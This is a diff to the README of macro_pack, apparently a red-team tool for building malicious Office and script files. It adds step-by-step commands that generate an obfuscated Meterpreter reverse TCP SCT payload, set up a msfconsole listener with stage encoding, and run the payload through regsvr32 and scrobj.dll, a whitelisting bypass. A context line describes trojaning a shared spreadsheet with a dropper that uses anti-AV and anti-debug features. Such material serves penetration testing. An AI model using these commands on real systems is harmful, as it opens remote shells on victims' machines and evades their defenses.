@@ -180,6 +180,28 @@ macro_pack.exe -l 1234
 mshta.exe full/path/to/info.hta
 ```
 
+
+ - Generate obfuscated Meterpreter reverse TCP SCT file and run it  
+ ```batch
+# 1 Generate obfuscated VBS based on meterpreter template
+echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.sct
+# 2 On attacker machinge Setup meterpreter listener
+Open msfconsole:
+use exploit/multi/handler
+set LHOST 0.0.0.0
+set PAYLOAD windows/meterpreter/reverse_tcp
+set AutoRunScript post/windows/manage/smart_migrate
+set EXITFUNC thread
+set ExitOnSession false
+set EnableUnicodeEncoding true
+set EnableStageEncoding true
+# 3 run VBS file with wscript (run 32bit wscript because meterpreter payload is 32bit)
+%windir%\syswow64\regsvr32 /u /n /s /i:meter.sct scrobj.dll
+
+ ```
+
+
+
 ### macro\_pack pro
 
 - Trojan the existing shared "report.xlsm" file with a dropper. Use anti-AV and anti-debug features.
